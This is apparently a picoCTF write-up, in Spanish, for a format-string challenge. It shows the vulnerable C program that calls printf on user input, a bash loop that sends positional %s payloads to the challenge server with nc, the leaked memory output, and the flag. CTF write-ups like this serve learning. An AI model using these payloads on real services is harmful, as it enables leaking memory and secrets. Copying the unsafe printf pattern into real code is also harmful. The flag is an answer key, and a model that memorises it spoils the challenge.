## Descripción
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using: `nc saturn.picoctf.net 57005`

## Hints
+ Format Strings

## Solución

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```


``` bash
┌──[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF/Binary_Explotation/04-Flag_Leak]
└──╼ $for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 57005 ; done
Tell me a story and then I'll tell you one >> Here's a story - 
%0$s
Tell me a story and then I'll tell you one >> Here's a story - 
%1$s
Tell me a story and then I'll tell you one >> Here's a story - 
���
Tell me a story and then I'll tell you one >> Here's a story - 
�ú,
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
/
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
�.
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
�������
Tell me a story and then I'll tell you one >> Here's a story - 
�(��g-��g-��g-��g-��g-��g-��g-��h-��
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 
����
Tell me a story and then I'll tell you one >> Here's a story - 
��e�

Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}



```

## Flag
```picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}```



## Notas adicionales




## Referencias
